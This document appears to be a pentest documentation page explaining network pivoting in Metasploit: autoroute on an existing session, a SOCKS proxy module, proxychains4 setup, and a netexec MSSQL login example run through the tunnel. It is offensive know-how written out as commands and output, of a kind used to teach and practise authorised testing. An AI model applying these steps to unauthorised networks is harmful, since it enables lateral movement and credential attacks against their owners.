---
title: Metasploit
sidebar_position: 2
---

- [Reference](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)

### **Autoroute**

**Steps**

1. Find details of the internal network

```powershell
ipconfig /all

ifconfig

# We need to retrieve: NETMASK (usually 255.255.255.0) and the INTERNAL NETWORK (for example 172.16.240.0/24)

```

1. **Select the module**

```bash
msf exploit(multi/handler) > use post/multi/manage/autoroute

```

1. **Configure the options**

```bash
set SESSION [ID]

set SUBNET [INTERNAL.NETWORK.ADDRESS.0]

set NETMASK /24

```

1. **Run the module**

```bash
msf post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WIN11-TEST
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.19.176.0/255.255.240.0 from host's routing table.
[*] Post module execution completed

```

**Check and delete routes**

```bash
# Verify successfull execution, it should appear with the command below
route

# Delete stablished routes
route flush

```

### **Socks**

**Steps**

1. **Configure the *autoroute*** from the previous step.
2. **Select the module**

```bash
msf exploit(multi/handler) > use auxiliary/server/socks_proxy

```

1. **Configure the options**

```bash
set SRVHOST 127.0.0.1

set SRVPORT 1080

set VERSION 4a

```

1. **Run the module**

```bash
msf auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

msf auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

```

1. **Configure *Proxychains4***

```bash
sudo nano /etc/proxychains4.conf

# Add this line at the end of the file
socks4  127.0.0.1 1080

```

1. **Use the tools you want**, below is just an example

```bash
proxychains4 -q netexec mssql targets.txt -u '[username]' -p '[password]'

```
